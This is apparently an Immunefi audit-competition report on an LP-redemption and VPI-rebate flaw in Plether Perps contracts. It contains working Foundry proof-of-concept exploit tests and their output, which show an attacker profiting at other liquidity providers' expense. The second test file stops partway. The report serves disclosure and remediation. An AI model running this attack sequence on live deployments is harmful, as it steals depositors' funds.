# \#98355 [SC-Critical] Temporary Junior LP redeems its share of opening VPI before the trader receives the same charge back on close

**Submitted on Nov 7th 2026 at 08:38:25 UTC by @Ox175 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98355
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An ordinary user can control a Junior LP account and a separate trader account. In the frozen Plether Perps v2.0.0 competition code, the trader opens a LONG and pays virtual price impact (VPI) into HousePool while the same user owns most of the Junior LP shares. The user redeems those shares, taking a share of that payment out of the pool, then closes the position at the unchanged oracle price. The close returns the opening VPI component to the trader, net of ordinary costs, even though part of the original payment is no longer in the pool. The direct local Foundry run through public vault and LP settlement paths and production V3 order validation and execution leaves both attacker accounts together 180.021755 settlement tokens ahead after their LP shares and trading position are gone. An unrelated Junior LP loses 1,179.855873 in share value. A separate capital-boundary case in the second PoC measures 1,194.953597 of attacker gain and 2,393.134935 of durable Junior LP share-value loss under different trade sizing. The audited code is frozen at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`; earlier affected versions and a shipped fix have not been verified.

Both PoCs were run locally against the frozen scoped contract bytes. The amounts below are observations with a six-decimal mock settlement token and local Pyth updates. Real Arbitrum gas and Pyth update fees were not measured.

## Expected rule and failure

The stated security objective is that the lifetime VPI clamp should prevent an LP sandwich from extracting a rebate-only round trip (`packages/perps/SECURITY.md`, “VPI limitations”). `CloseAccountingLib.buildCloseState` clamps a close so the trader account's proportional accrued VPI plus its close VPI cannot be negative. That protects the trader-level VPI ledger. It does not preserve who owns the opening payment after it has increased redeemable LP share value.

The failure crosses two legitimate accounts controlled by one economic actor. Mallory's trader pays VPI into the pool; Mallory's LP shares gain value; Mallory redeems and takes that value in cash; then Mallory's trader receives the ordinary VPI return on close. The close's cash comes from the LPs who remained. The PoC uses a separate neutral keeper and no privileged action after the standard seeded fixture is initialized.

## Vulnerability details

The VPI curve is `C(S) = 0.5 * k * S^2 / D`, where `S` is absolute side skew, `k` is the VPI factor, and `D` is economic pool depth (`packages/perps/src/CfdMath.sol`, `getSkewCost` and `calculateVPI`). Open planning uses live depth and enforces the pool-relative skew cap (`packages/perps/src/libraries/CfdEnginePlanLib.sol`, open planning). `CfdEngineSettlementSidecar.executeOpen` transfers positive trade cost from the trader's clearinghouse account to HousePool, records its net cash as claimant revenue, and credits the protocol execution fee separately. The test confirms that pool cash rises by exactly the 3,124.375124 VPI charge on this open. Mallory's Junior shares are valued at 6,999,999.999999 just before the open and 7,002,186.843905 just after it. Thus, while the position remains open, Mallory's redeemable LP stake already owns part of the payment that the trader can later recover.

After the ordinary cooldown, `TrancheVault.requestRedeem` queues all of Mallory's shares. Permissionless `OrderRouter.settleLpEpoch` obtains a PoolReconcile oracle update and calls HousePool settlement; `HousePool._fundRedemptionPhase` transfers funded assets to the vault and burns funded shares. `TrancheVault.claimRedeem` pays Mallory 7,002,186.831122. The test asserts every requested share was funded and Mallory has zero LP shares afterward. The attack uses public settlement, not `HousePool.settleLpEpoch` or the fixture's settlement shortcut (`packages/perps/src/OrderRouter.sol`, `settleLpEpoch`; `packages/perps/src/router/OrderLiquidationBatchLogic.sol`, `settleLpEpoch`; `packages/perps/src/HousePool.sol`, `_fundRedemptionPhase`).

Close planning uses current HousePool depth after that redemption (`packages/perps/src/libraries/CfdEnginePlanLib.sol`, `_buildCloseState`). Its raw curve rebate would be 10,406.476838, but the exact scoped `CloseAccountingLib.buildCloseState` clamps it to the 3,124.375124 opening VPI:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The scoped `CfdEngineLens.previewClose` confirms that clamped negative VPI, zero price PnL, and the ordinary close execution fee before execution. `CfdEngineSettlementSidecar.executeClose` pays the resulting **net** action rebate from HousePool to Mallory's trader clearinghouse balance. The public Router close succeeds at the same 1.00 price; final position size, lifetime VPI, and locked trader margin are zero (`packages/perps/src/CfdEngineSettlementSidecar.sol`, `executeClose`). The VPI component is returned in full; the cash payout is net of fees and other charges, not a separate gross 3,124.375124 transfer.

## Distinction from the published rebate-amplification issue

The public finding “Temporary pool-liquidity reduction can amplify a skew-reducing close rebate” in `audits/scan-plether-fi-plether-core-d4541b49.md` concerns a withdrawal that makes a close's negative VPI larger. That raw effect occurs here, but it does not explain the demonstrated gain: the live close is already clamped to the opening 3,124.375124. Mallory earns a profit despite receiving no VPI component above the amount paid on opening.

The test separately calls the unchanged scoped `CfdEngineLens.simulateClose` for the same full close, supplying the **opening** 10,002,000 pool assets instead of the reduced close-time assets. This is a read-only reference calculation, not an execution of patched contracts. It returns a 3,124.373061 VPI rebate, 0.002063 less than the live clamped rebate. Both scoped previews are valid, with the same execution fee and zero price PnL; the test verifies that their free-payout difference equals the VPI difference. Replacing only the VPI component in Mallory's observed final balance with this smaller reference amount leaves combined wealth of 7,500,180.019692, still **180.019692 above starting capital**. The simpler `CfdMath` calculation at opening depth returns 3,124.375124; the scoped planner reference is slightly more conservative because it uses its current projected state. Thus, correcting depth-driven rebate amplification alone leaves the ownership loss.

## Impact and original PoC ledger

The test uses the release's 1% VPI factor, 40% maximum skew ratio, 4-bps execution fee, 0.1%/0.2% maintenance/initial margin, and 5% annual base carry (`packages/perps/DEPLOYMENT.md`, release parameters). The fixture has 3,000,000 durable Junior capital and 2,000 seed capital. Mallory supplies 7,000,000 Junior capital and 500,000 trader collateral, then opens a 2,500,000-notional LONG with 100,000 margin. Both LP deposits activate through public `OrderRouter.settleLpEpoch`. Opening and closing oracle prices are both 1.00.

| Account or flow | Starting value | Final value or change |
| --- | ---: | ---: |
| Mallory's Junior LP | 7,000,000.000000 | 7,002,186.831122 redeemed; +2,186.831122 |
| Mallory's trader | 500,000.000000 | 497,993.190633 free; −2,006.809367 after the VPI round trip, 2,000.000000 in execution fees, 0.200000 keeper bounty, and 6.609367 in carry/other costs |
| All Mallory-controlled accounts | 7,500,000.000000 | 7,500,180.021755; **+180.021755** |
| Unrelated durable Junior LP | 3,000,000.000000 | 2,998,820.144127 share value; **−1,179.855873** |
| Remaining LPs including seed holders | 3,002,000.000000 | 3,000,819.778245 pool assets; **−1,180.221755** |
| Protocol treasury | 0 | +1,000.000000 |
| Independent keeper | 0 | +0.200000 |

The trader cost decomposes as `2,000.000000` in two 4-bps execution fees, `0.200000` paid to the neutral keeper, and `6.609367` in remaining carry and other settlement costs. The ledger reconciles exactly: `2,186.831122 − 2,006.809367 = 180.021755`, and `1,180.221755 = 180.021755 + 1,000.000000 + 0.200000`. The test sums wallet and clearinghouse balances for both Mallory-controlled accounts. The unrelated Junior LP's loss is a measured final share value, while the combined remaining-LP loss is the decrease in pool assets after Mallory has exited. Mallory ends with no LP shares and no trading position. The demonstrated profit is before unmeasured live-chain gas and real Pyth update fees.

## Remediation

Preserve backing and ownership across the life of an open VPI charge. One possible design would keep the refundable part of the opening charge outside redeemable LP NAV until the position's rebate obligation ends. Another would debit or reserve the portion leaving through LP redemption so a later close cannot return that same value from remaining LP capital. The design must handle transferred shares, partial LP exits, partial position closes, and multiple accounts without assuming addresses identify an economic owner. A regression should execute the same public deposit → open → redeem → close sequence, value every controlled account and the durable LP, and verify that both live-depth and opening-depth closes cannot transfer the opening VPI twice.

Preventing the raw close rebate from increasing when liquidity leaves is useful but insufficient. In this test the actual rebate is already capped at the ordinary opening amount, while part of that payment has left through LP redemption. The existing `vpiAccrued + vpiDelta >= 0` trader-level check cannot protect the missing pool backing.

## Proof of Concept

## Reproduce both PoCs

Both complete Solidity tests are embedded below. To reproduce them, save the respective code blocks as `packages/perps/test/perps/spec/lp/VpiLpRoundTripPoC.t.sol` and `packages/perps/test/perps/spec/lp/VpiLpMinimumCapital.t.sol` in a checkout of the frozen competition repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Then run from the checkout root:

```sh
cd packages/perps
forge test --offline --match-path 'test/perps/spec/lp/VpiLpRoundTripPoC.t.sol' -vv
forge test --offline --match-path 'test/perps/spec/lp/VpiLpMinimumCapital.t.sol' -vv
```

Both tests inherit the repository's `BasePerpTest` fixture. They replace USDG with a six-decimal mock settlement token and Pyth updates with local mock data; no in-scope contract source is changed. Both PoCs use `LegacyOrderRouterHarness`'s test-only scalar `commitOrder` adapter, which translates each call and delegates into production V3 commit validation; that scalar overload is not a deployed public entrypoint. Order execution, public vault `requestDeposit`/`claimDeposit` and `requestRedeem`/`claimRedeem`, and public `OrderRouter.settleLpEpoch` for deposits and redemption use the production paths. Foundry time advancement covers the normal LP cooldown and epoch maturation. The first test's `CfdEngineLens.simulateClose` call is only a read-only opening-depth reference; both executed attack sequences run against the frozen contracts.

The focused run produced the following output. All amounts below are six-decimal token atoms:

```text
[PASS] test_TemporaryLpInternalizesVpiChargeThenRedeemsBeforeRebate()
opening pool depth: 10002000000000
opening lifetime VPI: 3124375124
attacker LP value before open: 6999999999999
attacker LP value after open: 7002186843905
opening-depth ordinary close VPI: -3124375124
opening-depth planner close VPI: -3124373061
live capped close VPI refund: 3124375124
opening-depth reference VPI refund: 3124373061
reduced-depth raw close VPI: -10406476838
LP redemption proceeds: 7002186831122
LP revenue removed: 2186831122
trader round-trip cost, all fees and carry: 2006809367
two execution fees: 2000000000
remaining carry and other trader costs: 6609367
remaining LP and seed loss: 1180221755
durable Junior LP final share value: 2998820144127
independent keeper payout: 200000
protocol treasury fee balance: 1000000000
opening-depth reference final wealth: 7500180019692
remaining pool depth: 3002937544002
initial attacker capital: 7500000000000
final attacker wealth: 7500180021755
final durable pool assets: 3000819778245
absolute attacker profit: 180021755
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The assertions require full LP share funding, zero remaining Mallory LP shares, zero trader position and locked margin, an actual unrelated Junior LP share-value loss, and exact reconciliation of Mallory's profit to the remaining pool loss after treasury and independent keeper payouts. The opening-depth reference also asserts positive absolute profit with the smaller ordinary VPI rebate.

## Capital-boundary and repeated-cycle evidence

`VpiLpRoundTripPoC.t.sol` is the direct mechanism demonstration used in the ledger above. It uses 7,000,000 Junior LP tokens and 500,000 trader collateral to open a 2,500,000-notional LONG. Its read-only opening-depth close simulation shows that the combined profit remains positive when the close receives the smaller, unamplified VPI rebate. The local run measured 180.021755 tokens of attacker profit and a 1,179.855873-token decline in the unrelated Junior LP's share value.

`VpiLpMinimumCapital.t.sol` tests a different economic configuration of the same public deposit → open → full LP redemption → close path. The default case uses 4,490,250 Junior LP tokens, 3,002,912.706350 trader collateral, 3,002,912.506350 locked margin, and a 2,996,900-notional LONG. At the same 1.00 opening and closing price, it asserts full redemption, a close VPI rebate capped to the opening charge, zero remaining position and margin, and a reconciled loss borne by the remaining pool. The local run measured 7,493,162.706350 tokens of combined starting capital, 1,194.953597 tokens of attacker gain, and a 2,393.134935-token decline in the durable Junior LP's share value. This is a separate measured case, not a replacement for the original ledger.

The capital-boundary PoC also checks nearby boundaries: one token atom less LP capital fails public skew admission for that position; one atom more LP capital lowers both measured outcomes by one atom; one atom less **both collateral and margin** lowers both outcomes by one atom; a smaller position quantum lowers both outcomes; the next larger quantum fails skew admission at the stated LP capital and cannot fully redeem when LP capital is increased; and one atom less trader collateral cannot commit the stated open. These are local comparisons around the tested case. They do not establish a global minimum capital requirement or a global maximum profit. The capital-boundary PoC does not simulate an opening-depth close; the round-trip PoC supplies that separate control and shows that the ownership loss persists without raw rebate amplification.

The capital-boundary PoC also includes a distinct repeated-cycle test. It starts with 4,490,250 LP tokens and 4,000,000 trader-collateral tokens, redeposits the attacker's redeemed LP cash, and does not top up the durable LP. In the local default three-cycle run, cumulative attacker gain rose to 3,578.720937 tokens while the durable LP's share value fell by 7,169.325034 tokens. The test asserts that each completed cycle raises attacker wealth and lowers durable LP value. Its starting capital and outcomes are separate from the default one-cycle case; `ECON_CYCLES` can change the number of cycles.

The focused local run of `VpiLpMinimumCapital.t.sol` passed all nine tests (0 failed, 0 skipped). Its default-case output included:

```text
lp capital: 4490250000000
position notional: 2996900000000
trader collateral: 3002912706350
locked margin: 3002912506350
peak attacker capital: 7493162706350
opening VPI: 5993800000
LP redeemed: 4493842673597
attacker net gain: 1194953597
durable victim loss: 2393134935
all remaining LP loss: 2393913597
close VPI: -5993800000
```

The logged amounts above, including `position notional` after division by `1e12`, use six-decimal token atoms; the Solidity position-size input itself uses eighteen decimals. The repeated-cycle output reported cumulative gain `3578720937` and cumulative durable LP loss `7169325034` after cycle three. These are local mock-token results; live-chain gas and real Pyth update fees remain unmeasured.

## Complete PoC sources

The following code blocks contain both complete Solidity tests, including helpers and assertions. No separate PoC attachment is required.

### `VpiLpRoundTripPoC.t.sol` — direct round trip and opening-depth control

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

contract VpiLpRoundTripPoCTest is BasePerpTest {
    address internal constant DURABLE_LP = address(0xD00);
    address internal constant ATTACKER_LP = address(0xA770);
    address internal constant ATTACKER_TRADER = address(0xA771);
    address internal constant NEUTRAL_KEEPER = address(0xBEEF);

    uint256 internal constant DURABLE_CAPITAL = 3_000_000e6;
    uint256 internal constant ATTACKER_LP_CAPITAL = 7_000_000e6;
    uint256 internal constant ATTACKER_TRADER_CAPITAL = 500_000e6;
    uint256 internal constant POSITION_SIZE = 2_500_000e18;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_TemporaryLpInternalizesVpiChargeThenRedeemsBeforeRebate() public {
        _depositJuniorThroughRouter(DURABLE_LP, DURABLE_CAPITAL);
        uint256 attackerShares = _depositJuniorThroughRouter(ATTACKER_LP, ATTACKER_LP_CAPITAL);
        _fundTrader(ATTACKER_TRADER, ATTACKER_TRADER_CAPITAL);

        uint256 openingDepth = pool.totalAssets();
        uint256 attackerLpValueBeforeOpen = juniorVault.convertToAssets(attackerShares);
        _executeOrder(ATTACKER_TRADER, CfdTypes.Side.LONG, POSITION_SIZE, 100_000e6, false);
        (,,,,,, int256 accruedVpi) = engine.positions(ATTACKER_TRADER);
        assertGt(accruedVpi, 0, "opening must pay VPI into pool");
        uint256 attackerLpValueAfterOpen = juniorVault.convertToAssets(attackerShares);
        assertEq(pool.totalAssets() - openingDepth, uint256(accruedVpi), "opening VPI enters pool cash");
        assertGt(attackerLpValueAfterOpen, attackerLpValueBeforeOpen, "LP stake owns opening VPI revenue");
        uint256 skewAssets = POSITION_SIZE / 1e12;
        int256 ordinaryCloseVpi = CfdMath.calculateVPI(skewAssets, 0, openingDepth, 0.01e18);
        assertEq(ordinaryCloseVpi, -accruedVpi, "opening-depth close returns only ordinary VPI");

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        vm.warp(juniorVault.depositEpochStart(requestId));
        bytes[] memory settlementUpdate = _mockPythUpdateData(1e8);
        vm.prank(NEUTRAL_KEEPER);
        router.settleLpEpoch(settlementUpdate);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
        assertEq(claimableShares, attackerShares, "public settlement must fund all attacker shares");
        vm.prank(ATTACKER_LP);
        uint256 redeemedAssets = juniorVault.claimRedeem(requestId, claimableShares, ATTACKER_LP, ATTACKER_LP);
        assertEq(juniorVault.balanceOf(ATTACKER_LP), 0, "all attacker LP shares redeemed");

        uint256 remainingDepth = pool.totalAssets();
        int256 lowerDepthRawVpi = CfdMath.calculateVPI(skewAssets, 0, remainingDepth, 0.01e18);
        assertLt(lowerDepthRawVpi, ordinaryCloseVpi, "withdrawal enlarges raw rebate before clamp");
        ICfdEngineTypes.ClosePreview memory liveClose = engineLens.previewClose(ATTACKER_TRADER, POSITION_SIZE, 1e8);
        ICfdEngineTypes.ClosePreview memory openingDepthClose =
            engineLens.simulateClose(ATTACKER_TRADER, POSITION_SIZE, 1e8, openingDepth);
        assertTrue(liveClose.valid && openingDepthClose.valid, "both full-close plans must settle");
        assertEq(liveClose.vpiDeltaAssets, ordinaryCloseVpi, "live close pays only ordinary VPI after clamp");
        assertGt(openingDepthClose.vpiDeltaAssets, liveClose.vpiDeltaAssets, "opening-depth quote cannot amplify rebate");
        assertEq(liveClose.executionFeeAssets, openingDepthClose.executionFeeAssets, "same close execution fee");
        assertEq(liveClose.realizedPnlAssets, openingDepthClose.realizedPnlAssets, "same price PnL");
        assertEq(liveClose.realizedPnlAssets, 0, "unchanged price has no price PnL");
        assertEq(liveClose.frozenSpreadAssets, 0, "ordinary live close has no frozen spread");
        _executeOrder(ATTACKER_TRADER, CfdTypes.Side.LONG, POSITION_SIZE, 0, true);

        (uint256 remainingSize,,,,,, int256 remainingVpi) = engine.positions(ATTACKER_TRADER);
        assertEq(remainingSize, 0, "position fully closed");
        assertEq(remainingVpi, 0, "full close clears lifetime VPI");

        uint256 finalTraderAssets = clearinghouse.balanceAssets(ATTACKER_TRADER);
        uint256 finalWealth = settlementToken.balanceOf(ATTACKER_LP)
            + settlementToken.balanceOf(ATTACKER_TRADER)
            + clearinghouse.balanceAssets(ATTACKER_LP) + finalTraderAssets;
        uint256 initialCapital = ATTACKER_LP_CAPITAL + ATTACKER_TRADER_CAPITAL;
        uint256 finalPoolAssets = pool.totalAssets();
        uint256 durableLpFinalValue = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE_LP));
        // Reference ledger: replace only the live close VPI with the scoped lens's opening-depth
        // close VPI. The position, time, price, carry projection, and fees remain the same.
        uint256 correctedRebate = uint256(-openingDepthClose.vpiDeltaAssets);
        uint256 actualCappedRebate = uint256(-liveClose.vpiDeltaAssets);
        assertEq(
            liveClose.payoutToFreeSettlementAssets - openingDepthClose.payoutToFreeSettlementAssets,
            actualCappedRebate - correctedRebate,
            "reference payout differs only by VPI"
        );
        uint256 openingDepthReferenceWealth = finalWealth - actualCappedRebate + correctedRebate;
        uint256 lpRevenueRemoved = redeemedAssets - ATTACKER_LP_CAPITAL;
        uint256 traderRoundTripCost = ATTACKER_TRADER_CAPITAL - finalTraderAssets;
        uint256 remainingLpLoss = DURABLE_CAPITAL + 2_000e6 - finalPoolAssets;
        uint256 keeperPayout = settlementToken.balanceOf(NEUTRAL_KEEPER)
            + clearinghouse.balanceAssets(NEUTRAL_KEEPER);
        uint256 treasuryBalance = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 twoExecutionFees = 2 * ((skewAssets * engine.executionFeeBps()) / 10_000);
        uint256 residualHoldingCost = traderRoundTripCost - twoExecutionFees - keeperPayout;
        assertEq(engine.executionFeeBps(), 4, "release execution fee must be four bps");
        assertEq(clearinghouse.lockedMarginAssets(ATTACKER_TRADER), 0, "no residual trader margin");
        assertGt(openingDepthReferenceWealth, initialCapital, "ordinary rebate preserves absolute profit");
        assertEq(lpRevenueRemoved - traderRoundTripCost, finalWealth - initialCapital, "consolidated ledger");
        assertGt(remainingLpLoss, 0, "remaining LP and seed capital bear loss");
        assertLt(durableLpFinalValue, DURABLE_CAPITAL, "unrelated durable Junior LP loses value");
        assertEq(
            remainingLpLoss,
            finalWealth - initialCapital + keeperPayout + treasuryBalance,
            "remaining LP loss funds attacker and protocol fee"
        );
        emit log_named_uint("opening pool depth", openingDepth);
        emit log_named_int("opening lifetime VPI", accruedVpi);
        emit log_named_uint("attacker LP value before open", attackerLpValueBeforeOpen);
        emit log_named_uint("attacker LP value after open", attackerLpValueAfterOpen);
        emit log_named_int("opening-depth ordinary close VPI", ordinaryCloseVpi);
        emit log_named_int("opening-depth planner close VPI", openingDepthClose.vpiDeltaAssets);
        emit log_named_uint("live capped close VPI refund", actualCappedRebate);
        emit log_named_uint("opening-depth reference VPI refund", correctedRebate);
        emit log_named_int("reduced-depth raw close VPI", lowerDepthRawVpi);
        emit log_named_uint("LP redemption proceeds", redeemedAssets);
        emit log_named_uint("LP revenue removed", lpRevenueRemoved);
        emit log_named_uint("trader round-trip cost, all fees and carry", traderRoundTripCost);
        emit log_named_uint("two execution fees", twoExecutionFees);
        emit log_named_uint("remaining carry and other trader costs", residualHoldingCost);
        emit log_named_uint("remaining LP and seed loss", remainingLpLoss);
        emit log_named_uint("durable Junior LP final share value", durableLpFinalValue);
        emit log_named_uint("independent keeper payout", keeperPayout);
        emit log_named_uint("protocol treasury fee balance", treasuryBalance);
        emit log_named_uint("opening-depth reference final wealth", openingDepthReferenceWealth);
        emit log_named_uint("remaining pool depth", remainingDepth);
        emit log_named_uint("initial attacker capital", initialCapital);
        emit log_named_uint("final attacker wealth", finalWealth);
        emit log_named_uint("final durable pool assets", finalPoolAssets);
        if (finalWealth >= initialCapital) {
            emit log_named_uint("absolute attacker profit", finalWealth - initialCapital);
        } else {
            emit log_named_uint("absolute attacker loss", initialCapital - finalWealth);
        }
        assertGt(finalWealth, initialCapital, "round trip must be absolutely profitable");
    }

    function _depositJuniorThroughRouter(address lp, uint256 amount) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        bytes[] memory settlementUpdate = _mockPythUpdateData(1e8);
        vm.prank(NEUTRAL_KEEPER);
        router.settleLpEpoch(settlementUpdate);
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "public LP deposit must activate in full");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "public LP deposit must mint shares");
    }

    function _executeOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, isClose ? 0 : 1e8, isClose);
        bytes[] memory executionUpdate = _mockPythUpdateData(1e8);
        vm.prank(NEUTRAL_KEEPER);
        router.executeOrder(orderId, executionUpdate);
    }
}
```

### `VpiLpMinimumCapital.t.sol` — capital boundaries and repeat cycles

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Atom-resolution capital and outcome boundaries for the temporary-LP/VPI round trip.
/// @dev Successful cases use public LP paths and the test-only scalar commit adapter at the same 1.00 mark.
///      Token amounts are six-decimal atoms; position sizes are eighteen-decimal atoms.
contract VpiLpMinimumCapitalTest is BasePerpTest {
    address internal constant DURABLE = address(0xD00);
    address internal constant LP = address(0xA770);
    address internal constant TRADER = address(0xA771);
    address internal constant KEEPER = address(0xBEEF);
    uint256 internal constant DURABLE_CAPITAL = 3_000_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_ParameterizedEconomicCase() public {
        uint256 lpCapital = vm.envOr("ECON_LP", uint256(4_490_250e6));
        uint256 size = vm.envOr("ECON_SIZE", uint256(2_996_900e18));
        uint256 collateral = vm.envOr("ECON_COLLATERAL", uint256(3_002_912_706_350));
        uint256 margin = vm.envOr("ECON_MARGIN", uint256(3_002_912_506_350));

        _economicCase(lpCapital, size, collateral, margin);
    }

    function _economicCase(uint256 lpCapital, uint256 size, uint256 collateral, uint256 margin) internal {

        _deposit(DURABLE, DURABLE_CAPITAL, true);
        uint256 start = vm.getBlockTimestamp();
        uint256 shares = _deposit(LP, lpCapital, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _fundTrader(TRADER, collateral);
        uint256 depth = pool.totalAssets();
        uint256 freeBefore = pool.getFreeAssets();
        assertEq(depth, DURABLE_CAPITAL + lpCapital + 2_000e6, "fixed victim and seed liquidity");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");

        uint256 traderStart = vm.getBlockTimestamp();
        _order(false, size, margin);
        (,,,,,, int256 openingVpi) = engine.positions(TRADER);
        assertEq(pool.totalAssets() - depth, uint256(openingVpi), "opening VPI enters pool cash");
        uint256 freeBeforeRedeem = pool.getFreeAssets();
        uint256 juniorCap = pool.getMaxJuniorWithdraw();
        uint256 lpValueAfterOpen = juniorVault.convertToAssets(shares);

        vm.prank(LP);
        uint256 requestId = juniorVault.requestRedeem(shares, LP, LP);
        uint256 redeemRequestTime = vm.getBlockTimestamp();
        vm.warp(juniorVault.depositEpochStart(requestId));
        bytes[] memory redemptionUpdate = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(redemptionUpdate);
        uint256 funded = juniorVault.claimableRedeemRequest(requestId, LP);
        require(funded == shares, "REDEMPTION_CAP");
        vm.prank(LP);
        uint256 redeemed = juniorVault.claimRedeem(requestId, funded, LP, LP);

        ICfdEngineTypes.ClosePreview memory close = engineLens.previewClose(TRADER, size, 1e8);
        require(close.valid, "CLOSE_INVALID");
        assertEq(close.realizedPnlAssets, 0, "price remains unchanged");
        assertEq(close.vpiDeltaAssets, -openingVpi, "close rebate is capped to opening VPI");
        _order(true, size, 0);
        (uint256 remainingSize,,,,,, int256 remainingVpi) = engine.positions(TRADER);
        assertEq(remainingSize, 0);
        assertEq(remainingVpi, 0);
        assertEq(juniorVault.balanceOf(LP), 0);
        assertEq(clearinghouse.lockedMarginAssets(TRADER), 0);

        uint256 finalTrader = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
        uint256 finalWealth = redeemed + finalTrader;
        uint256 initialWealth = lpCapital + collateral;
        uint256 durableFinal = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE));
        uint256 remainingPool = pool.totalAssets();
        uint256 keeperPayout = settlementToken.balanceOf(KEEPER) + clearinghouse.balanceAssets(KEEPER);
        uint256 treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 traderExpense = collateral - finalTrader;
        uint256 twoExecutionFees = 2 * ((size / 1e12) * engine.executionFeeBps() / 10_000);

        emit log_named_uint("lp capital", lpCapital);
        emit log_named_uint("position notional", size / 1e12);
        emit log_named_uint("trader collateral", collateral);
        emit log_named_uint("locked margin", margin);
        emit log_named_uint("peak attacker capital", initialWealth);
        emit log_named_uint("opening depth", depth);
        emit log_named_uint("free before open", freeBefore);
        emit log_named_uint("free before redeem", freeBeforeRedeem);
        emit log_named_uint("junior redemption cap", juniorCap);
        emit log_named_int("opening VPI", openingVpi);
        emit log_named_uint("LP value after open", lpValueAfterOpen);
        emit log_named_uint("LP redeemed", redeemed);
        emit log_named_uint("LP quote erosion before redemption", lpValueAfterOpen - redeemed);
        emit log_named_uint("two execution fees", twoExecutionFees);
        emit log_named_uint("trader unrecoverable expense", traderExpense);
        emit log_named_uint("other trader expense", traderExpense - twoExecutionFees - keeperPayout);
        emit log_named_int("attacker net gain", int256(finalWealth) - int256(initialWealth));
        emit log_named_int("durable victim loss", int256(DURABLE_CAPITAL) - int256(durableFinal));
        emit log_named_int("all remaining LP loss", int256(DURABLE_CAPITAL + 2_000e6) - int256(remainingPool));
        emit log_named_uint("keeper payout", keeperPayout);
        emit log_named_uint("treasury payout", treasury);
        emit log_named_uint("LP capital time seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("trader capital time seconds", vm.getBlockTimestamp() - traderStart);
        emit log_named_uint("redeem request time", redeemRequestTime);
        emit log_named_uint("redeem maturity time", juniorVault.depositEpochStart(requestId));
        emit log_named_int("close VPI", close.vpiDeltaAssets);
        assertEq(
            int256(DURABLE_CAPITAL + 2_000e6) - int256(remainingPool),
            int256(finalWealth) - int256(initialWealth) + int256(keeperPayout + treasury),
            "cash-flow reconciliation"
        );
        if (lpCapital == 4_490_250e6 && size == 2_996_900e18 && margin == 3_002_912_506_350
            && collateral == 3_002_912_706_350) {
            assertEq(initialWealth, 7_493_162_706_350, "minimum peak capital for maximum outcome");
            assertEq(traderExpense, 2_397_720_000, "unrecoverable trader expenses");
            assertEq(redeemed - lpCapital, 3_592_673_597, "LP proceeds above principal");
            assertEq(vm.getBlockTimestamp() - start, 2 hours + 5 minutes + 4 seconds, "fixed LP time horizon");
            assertEq(vm.getBlockTimestamp() - traderStart, 5 minutes + 4 seconds, "trader capital time");
            assertEq(finalWealth - initialWealth, 1_194_953_597, "maximum measured gain");
            assertEq(DURABLE_CAPITAL - durableFinal, 2_393_134_935, "durable victim loss");
        }
    }

    /// @notice The successful candidate is the exact 40% skew boundary at opening.
    /// An LP deposit one token atom smaller cannot open the same 2,996,900-notional position.
